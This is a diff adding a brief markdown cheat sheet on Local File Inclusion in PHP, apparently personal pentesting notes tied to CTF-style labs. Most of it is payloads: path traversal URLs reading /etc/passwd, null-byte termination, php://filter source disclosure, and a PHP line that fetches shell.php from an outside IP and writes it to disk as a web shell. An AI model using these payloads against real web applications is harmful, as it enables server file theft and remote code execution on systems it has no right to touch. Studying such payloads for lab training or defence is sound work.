@@ -1,0 +1,25 @@
+---
+title: LFI
+description:  Local File Inclusion
+---
+
+LFI attacks against web applications are often due to a developers' lack of security awareness. With PHP, using functions such as `include`, `require`, `include_once`, and `require_once` often contribute to vulnerable web applications
+
+## NULL BYTES
+**%00 or 0x00**
+
+Using null bytes is an injection technique where URL-encoded representation such as %00 or 0x00 in hex with user-supplied data to terminate strings. You could think of it as trying to trick the web app into disregarding whatever comes after the Null Byte.
+```html
+http://10.10.14.127/lab3.php?file=/../../../../../../etc/passwd%00
+
+http://mafialive.thm/test.php?view=/var/www/html/development_testing///..//..//..//..//etc/passwd
+
+php://filter/convert.base64-encode/resource=
+
+<?php file_put_contents('shell.php', file_get_contents('http://10.6.57.139:8000/shell.php')) ?>
+```
+
+## PHP Filter
+```html
+http://example.com/index.php?page=php://filter/convert.base64-encode/resource=index.php
+```
